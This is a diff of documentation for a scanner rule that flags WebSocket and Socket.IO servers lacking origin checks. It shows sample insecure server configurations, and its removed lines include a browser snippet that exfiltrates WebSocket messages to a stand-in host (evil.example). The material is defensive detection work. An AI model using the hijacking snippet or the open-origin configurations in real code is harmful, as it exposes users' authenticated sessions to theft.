@@ -1,6 +1,6 @@
 ---
 title: "VNX-NODE-015 – WebSocket Server Without Origin Verification (CSWSH)"
-description: "Detect WebSocket or Socket.IO servers created without origin validation, enabling Cross-Site WebSocket Hijacking attacks."
+description: "Reports a ws WebSocket server created without a verifyClient callback in a file that never checks the Origin header, and a Socket.IO server whose cors origin is '*' or true (or origins '*:*') without allowRequest, both of which allow Cross-Site WebSocket Hijacking."
 ---
 
 ## Overview
@@ -21,25 +21,21 @@ The `ws` library's `WebSocket.Server` does **not** perform origin validation by 
 
 ## What Gets Flagged
 
-The rule matches `WebSocket.Server` constructor calls that lack a `verifyClient` option on the same line, and Socket.IO / `new Server()` instantiation with `cors: { origin: '*' }`.
-
 ```javascript
-// FLAGGED: ws server without verifyClient — accepts connections from any origin
+// FLAGGED: no verifyClient and no origin check in the file
 const wss = new WebSocket.Server({ port: 8080 });
+const live = new WebSocketServer({ server, path: '/live' });
 
-// FLAGGED: Socket.IO with wildcard CORS origin
-const io = new Server(httpServer, { cors: { origin: '*' } });
-
-// FLAGGED: io() with wildcard cors
-const io = io(server, { cors: { origin: '*', methods: ['GET', 'POST'] } });
+// FLAGGED: Socket.IO accepts every origin
+const io = new Server(httpServer, {
+  cors: {
+    origin: '*',
+    credentials: true,
+  },
+});
 ```
 
-A malicious page on any domain can open an authenticated session:
-```javascript
-// Runs silently from https://evil.example — victim's cookies are sent automatically
-const ws = new WebSocket('wss://api.example.com/ws');
-ws.onmessage = (e) => fetch('https://evil.example/exfil?d=' + e.data);
-```
+Not flagged: `verifyClient: ({ origin }) => ALLOWED.has(origin)`, a `noServer` server whose `upgrade` handler checks `req.headers.origin`, Socket.IO with a list of origins, Express `cors({ origin: '*' })` middleware, browser `new WebSocket(...)` clients and test files.
 
 ## Remediation
 
